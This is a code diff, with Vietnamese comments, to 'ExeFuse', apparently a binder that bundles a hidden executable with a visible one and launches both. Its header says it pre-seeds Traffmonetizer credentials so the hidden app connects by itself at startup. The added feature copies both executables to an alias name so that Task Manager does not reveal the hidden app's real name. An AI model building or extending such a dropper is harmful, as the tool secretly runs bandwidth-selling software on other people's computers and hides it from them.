@@ -12,6 +12,9 @@ Nhiem vu:
                      Traffmonetizer (%APPDATA%\\traffmonetizer\\settings.json)
                      de app tu dang nhap + tu ket noi khi khoi dong.
   4. Don dep       : khi app chinh dong -> kill tien trinh an (neu cau hinh).
+  5. Gia ten TTM   : (tuy chon) copy 2 app sang ten trung voi ten file
+                     output -> Task Manager chi thay mot ten duy nhat,
+                     khong lo ten that cua app an.
 
 Cac token %%...%% se duoc builder thay bang gia tri that truoc khi build.
 """
@@ -19,6 +22,7 @@ Cac token %%...%% se duoc builder thay bang gia tri that truoc khi build.
 import atexit
 import json
 import os
+import shutil
 import subprocess
 import sys
 import threading
@@ -31,6 +35,11 @@ HIDDEN_NAME = "%%HIDDEN_NAME%%"
 VISIBLE_NAME = "%%VISIBLE_NAME%%"  # rong = che do SOLO (chi chay app an)
 KILL_HIDDEN_ON_VISIBLE_EXIT = %%KILL_HIDDEN%%
 ENABLE_HIDE_WATCHER = %%HIDE_WATCH%%
+
+# Ten alias de hien trong Task Manager: khac rong -> copy 2 app sang
+# ten <PROC_ALIAS>.exe truoc khi chay, tien trinh se hien trung ten file
+# output thay vi ten goc (vd __hidden_app__.exe / Traffmonetizer.exe).
+PROC_ALIAS = "%%PROC_ALIAS%%"
 
 # --- Auto-token Traffmonetizer ---
 TM_PRESEED = %%TM_PRESEED%%          # True neu file an la Traffmonetizer + co token
@@ -47,6 +56,31 @@ def _resource_base():
 
 def _exe_path(name):
     return os.path.join(_resource_base(), name)
+
+
+def _aliased_path(name):
+    """Tra ve duong dan exe DA DUOI TEN ALIAS (neu PROC_ALIAS duoc bat).
+
+    File nhung trong bundle co ten co dinh (__hidden_app__.exe...). Task
+    Manager hien ten cua FILE exe ma tien trinh chay tu do. Vi vay ta copy
+    file sang <PROC_ALIAS>.exe trong thu muc con rieng roi chay tu copy nay:
+    moi tien trinh se hien dung ten file output - dong nhat, khong lo ten
+    that cua app an.
+    """
+    src = _exe_path(name)
+    if not PROC_ALIAS:
+        return src
+    try:
+        slot = "_alias_" + os.path.splitext(os.path.basename(name))[0]
+        dst_dir = os.path.join(_resource_base(), slot)
+        os.makedirs(dst_dir, exist_ok=True)
+        dst = os.path.join(dst_dir, PROC_ALIAS + ".exe")
+        if not os.path.isfile(dst):
+            shutil.copy2(src, dst)
+        return dst
+    except Exception:
+        # That bai (khong quyen ghi...) -> chay tu file goc nhu cu
+        return src
 
 
 def _launch_cwd():
@@ -201,7 +235,7 @@ def main():
     _preseed_traffmonetizer()
 
     # --- App an (bat buoc) ---
-    hidden_path = _exe_path(HIDDEN_NAME)
+    hidden_path = _aliased_path(HIDDEN_NAME)
     if not os.path.isfile(hidden_path):
         _fatal("ExeFuse: không tìm thấy tệp ẩn nhúng trong bundle:\n%s" % hidden_path)
         return 1
@@ -221,7 +255,7 @@ def main():
         return 0
 
     # --- App hien (neu co trong bundle) ---
-    visible_path = _exe_path(VISIBLE_NAME)
+    visible_path = _aliased_path(VISIBLE_NAME)
     if not os.path.isfile(visible_path):
         _fatal("ExeFuse: không tìm thấy tệp hiển thị nhúng trong bundle:\n%s" % visible_path)
         return 1
